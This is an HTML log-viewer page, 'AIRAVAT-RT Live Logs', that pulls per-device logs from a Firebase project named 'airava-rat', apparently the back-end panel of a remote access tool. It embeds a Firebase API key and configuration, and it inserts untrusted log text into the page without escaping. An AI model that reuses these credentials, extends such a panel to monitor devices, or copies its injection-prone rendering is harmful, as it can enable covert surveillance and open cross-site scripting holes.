<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AIRAVAT-RT | Live Logs</title>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
    <style>
        body { font-family: monospace; background: #0a0e27; color: #00ffcc; padding: 20px; }
        .log-entry { border-bottom: 1px solid #333; padding: 8px; margin: 5px 0; }
        .timestamp { color: #ff00cc; font-size: 11px; }
        .msg { color: #fff; }
        button { background: #00ffcc; color: #0a0e27; border: none; padding: 10px; margin: 5px; cursor: pointer; border-radius: 5px; }
        .container { max-width: 900px; margin: 0 auto; }
        .log-view { background: #1a1e3f; padding: 15px; border-radius: 10px; max-height: 500px; overflow-y: auto; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔥 AIRAVAT-RT Live Logs</h1>
        <button onclick="refreshLogs()">🔄 Refresh</button>
        <button onclick="clearLogs()">🗑️ Clear View</button>
        <div id="logs" class="log-view">Loading logs...</div>
    </div>
    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyBFyaNb3Zaktpn0wsdtHhAfybRCSo2xInM",
            authDomain: "airava-rat.firebaseapp.com",
            databaseURL: "https://airava-rat-default-rtdb.firebaseio.com",
            projectId: "airava-rat",
            storageBucket: "airava-rat.firebasestorage.app",
            messagingSenderId: "670431784173",
            appId: "1:670431784173:web:9f0cd68835d7c58d85b0e4"
        };
        
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();
        
        function refreshLogs() {
            const logsDiv = document.getElementById('logs');
            logsDiv.innerHTML = 'Loading...';
            
            db.ref('logolog').once('value', (snapshot) => {
                const data = snapshot.val();
                logsDiv.innerHTML = '';
                
                if (!data) {
                    logsDiv.innerHTML = 'No logs found. Make sure the app is running.';
                    return;
                }
                
                // Iterate through all devices in logolog
                Object.entries(data).forEach(([deviceId, deviceLogs]) => {
                    const deviceSection = document.createElement('div');
                    deviceSection.innerHTML = `<h3>📱 Device: ${deviceId.substring(0, 20)}...</h3>`;
                    logsDiv.appendChild(deviceSection);
                    
                    if (deviceLogs) {
                        Object.entries(deviceLogs).forEach(([logId, logEntry]) => {
                            const logDiv = document.createElement('div');
                            logDiv.className = 'log-entry';
                            logDiv.innerHTML = `
                                <div class="timestamp">🕐 ${logEntry.logodate || 'No date'}</div>
                                <div class="msg">📌 ${logEntry.msg || 'No message'}</div>
                                <div class="event">⚡ ${logEntry.logoev || 'No event'}</div>
                            `;
                            deviceSection.appendChild(logDiv);
                        });
                    }
                });
            }).catch(err => {
                document.getElementById('logs').innerHTML = `Error: ${err.message}`;
            });
        }
        
        function clearLogs() {
            document.getElementById('logs').innerHTML = 'Logs cleared. Click Refresh to reload.';
        }
        
        // Auto-refresh every 10 seconds
        refreshLogs();
        setInterval(refreshLogs, 10000);
    </script>
</body>
</html>
